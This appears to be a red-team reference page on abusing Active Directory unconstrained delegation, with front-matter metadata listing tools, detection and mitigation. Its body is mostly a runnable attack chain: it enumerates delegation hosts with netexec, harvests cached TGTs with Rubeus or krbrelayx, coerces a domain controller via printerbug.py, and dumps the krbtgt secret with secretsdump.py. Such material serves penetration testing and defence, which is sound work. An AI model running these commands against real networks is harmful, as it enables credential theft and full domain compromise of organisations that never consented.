---
title: Unconstrained delegation
category: AD / Delegation
order: 10
tags: [delegation, unconstrained, tgt, coercion, printerbug]
summary: >
  A host trusted for unconstrained delegation caches the TGT of any user that
  authenticates to it. Compromise such a host, coerce a DC to authenticate, and
  you capture the DC's TGT → domain compromise.
prerequisites:
  - Control of a computer configured with TRUSTED_FOR_DELEGATION (userAccountControl 0x80000)
  - Ability to coerce a target (e.g. DC$) to authenticate to that host
tools: [Rubeus, impacket (krbrelayx / addcomputer), printerbug.py, mimikatz]
detection:
  - Any non-DC with unconstrained delegation is a red flag — inventory them
  - Spooler/EFSRPC coercion toward a delegation host; TGT monitoring
mitigation:
  - Eliminate unconstrained delegation; mark Tier-0 accounts "sensitive, cannot be delegated" + Protected Users
refs:
  - { label: "hackndo — Unconstrained", url: "https://en.hackndo.com/constrained-unconstrained-delegation/" }
  - { label: "Dirk-jan — Printer bug + delegation", url: "https://dirkjanm.io/" }
---

Any account that authenticates to an unconstrained-delegation host leaves its
**full TGT** in that host's memory (LSASS). If you own the host, you can extract
and reuse those TGTs.

## Find hosts

```sh
netexec ldap $dc_ip -u $user -p $password --trusted-for-delegation
# BloodHound: "Find Computers with Unconstrained Delegation"
```

## Capture TGTs on a host you control

```powershell
# monitor for and export incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap
```

```sh
# from Linux if you own the machine account: run a listener
krbrelayx.py -aesKey <machine_aes_key>
```

## Force a DC to come to you

Trigger DC$ to authenticate to your unconstrained host (Spooler/EFSRPC):

```sh
printerbug.py $domain/$user:$password@$dc_host $target   # $target = your unconstrained host
```

Now you hold the DC's TGT → inject it and DCSync:

```sh
# ptt the captured DC TGT, then replicate
secretsdump.py -k -no-pass $dc_host -just-dc-user $domain_nb/krbtgt
```

> Owning a machine account's AES key lets `krbrelayx` decrypt the incoming
> service ticket without touching LSASS on the host.
